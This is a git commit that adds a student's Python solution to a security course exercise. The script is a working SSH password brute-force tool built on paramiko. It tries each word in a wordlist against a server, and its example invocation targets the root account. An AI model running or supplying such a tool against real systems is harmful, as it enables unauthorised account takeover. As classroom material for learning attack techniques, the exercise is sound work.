a3eccdceeecfa7f02130d259dcfaa46118ce987a
Ademola Olatunbosun <ademomo11@gmail.com>
2023-05-10 04:50:51 +0000

    this is my commit message

---
+++ Class 17.py
@@ -0,0 +1,39 @@
+# !/usr/bin/env python3
+# Script: OPS 401 Class 02 Ops Challenge Solution
+# Author: Ademola
+# Date of latest revision: 9 May 2023
+# Purpose: Ops Challenge: Automated Brute Force Wordlist Attack Tool Part 2 of 3
+# Firstly install paramiko using: **pip3 install paramiko**
+import paramiko
+
+def attempt_login(server_ip, username, password):
+    """Attempt to login to the server."""
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        client.connect(server_ip, username=username, password=password)
+        return True
+    except paramiko.AuthenticationException:
+        return False
+    finally:
+        client.close()
+
+def brute_force_ssh(server_ip, username, word_list_file):
+    """Attempt to brute force the SSH server."""
+    with open(word_list_file, 'r') as file:
+        for line in file:
+            password = line.strip()
+
+            if attempt_login(server_ip, username, password):
+                print(f'Success! The password is {password}')
+                return password
+
+    print('Failed to find password.')
+    return None
+
+# Example usage:
+# brute_force_ssh('192.168.1.1', 'root', 'wordlist.txt')
+
+# Reference
+## OpenAI
